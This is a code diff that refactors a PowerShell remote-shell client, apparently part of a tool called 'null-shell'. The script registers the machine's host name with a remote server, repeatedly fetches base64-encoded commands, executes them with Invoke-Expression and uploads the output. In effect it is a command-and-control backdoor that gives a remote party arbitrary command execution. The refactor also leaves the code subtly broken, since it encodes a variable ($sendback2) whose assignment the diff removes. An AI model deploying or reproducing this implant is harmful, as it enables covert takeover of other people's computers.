@@ -102,75 +102,94 @@ function base64string-decode {
 }
 
 
+function proc-loop { 
+
+        $hostname = set-sysname
+        $enchostname = base64url-encode $hostname
+        $enckey = base64url-encode $key
+        $enroll = $uri + "?auth=" + $enckey + "&reg=" + $enchostname
+        $bucket = send-request $enroll
+
+      	while (1)
+       	{
+		try
+		{
+
+	   		#Pull command to be executed by this client
+       	    		$getcmd = $uri + "?auth=" + $enckey + "&get=" + $enchostname
+	    		$enccmd = send-request $getcmd
+
+			# Ignore running the same command repeatedly, when server is unmanned.
+			if ( -not ("$oldenccmd" -eq "$enccmd")) { 
+
+                		# setting previous encoded command
+                     		$oldenccmd = $enccmd
+
+		     		$cmd = base64string-decode $enccmd
+
+				if ( $cmd -notmatch 'ftp' ) {
+
+                			# Execute the command on the client.
+                			$sendback = (Invoke-Expression -Command "$cmd" 2>&1 | Out-String )
+
+				} else { $sendback = 'The windows ftp client is not supported in async mode' } 
+
+				# prep output to be uploaded.         	
+				$encstdout = base64url-encode $sendback2
+
+				# Check base64 encoded string length and trim it if too close to url character limit, allow room.
+				if ( $encstdout.length -gt 65000 ) { 
+					$encstdout = $encstdout.substring(0, [System.Math]::Min(65000, $encstdout.length))
+				}
+
+				# Upload the stdout of executed command to server
+				$upload = $uri + "?auth=" + $enckey + "&data=" + $encstdout + "&host=" + $enchostname
+				$bucket = send-request $upload
+
+			}
+
+		}
+
+		catch
+		{
+			# uncomment warnings below for debugging
+			#Write-Warning "Something went wrong with execution of command via client."
+			#Write-Error $_
+
+                        $x = ($error[0] | Out-String)
+                        $error.clear()
+
+                        $error = 'COMMAND FAILED!!! Waiting for 60 seconds before checking back in.'
+			$senderror = $error + $x
+                        $encstdout = base64url-encode $senderror
+
+                        # Upload the stdout of executed command to server
+                        $upload = $uri + "?auth=" + $enckey + "&data=" + $encstdout + "&host=" + $enchostname
+                        $bucket = send-request $upload
+
+			Start-Sleep -s 60
+
+		}
+
+		Start-Sleep -s 5
+         }
+
+
+} 
+
 while (1)
 {
-
 
 	try
 	{
 	
-		$hostname = set-sysname
-		$enchostname = base64url-encode $hostname
-		$enckey = base64url-encode $key
-	        $enroll = $uri + "?auth=" + $enckey + "&reg=" + $enchostname
-		$bucket = send-request $enroll
-
-        	while (1)
-        	{
-
-			try
-			{
-
-	       			#Pull command to be executed by this client
-       	    			$getcmd = $uri + "?auth=" + $enckey + "&get=" + $enchostname
-	    			$enccmd = send-request $getcmd
-
-				# Ignore running the same command repeatedly, when server is unmanned.
-				if ( -not ("$oldenccmd" -eq "$enccmd")) { 
-
-                                        # setting previous encoded command
-                                        $oldenccmd = $enccmd
-
-					$cmd = base64string-decode $enccmd
-
-                			# Execute the command on the client.
-                			$sendback = (Invoke-Expression -Command "$cmd" 2>&1 | Out-String )
-         	
-					# Prep the output of command to be uploaded to server
-					$x = ($error[0] | Out-String)
-					$error.clear()
-					$sendback2 = $sendback + $x
-
-					$encstdout = base64url-encode $sendback2
-
-					# Check base64 encoded string length and trim it if too close to url character limit, allow room.
-					if ( $encstdout.length -gt 65000 ) { 
-						$encstdout = $encstdout.substring(0, [System.Math]::Min(65000, $encstdout.length))
-					}
-
-					# Upload the stdout of executed command to server
-					$upload = $uri + "?auth=" + $enckey + "&data=" + $encstdout + "&host=" + $enchostname
-					$bucket = send-request $upload
-
-				}
-
-			}
-
-			catch
-			{
-				# uncomment the warnings below for debugging
-				#Write-Warning "Something went wrong with execution of command via client."
-				#Write-Error $_
-				Start-Sleep -s 300
-			}
-
-			Start-Sleep -s 5
-         	}
+		proc-loop
+        
 	}
 
 	catch
 	{
-		# uncomment the warnings below for debugging
+		# uncomment warnings below for debugging
         	#Write-Warning "Attempting to contact $uri failed do you have the null-shell cgi set up?, will retry."
         	#Write-Error $_
     		Start-Sleep -s 300
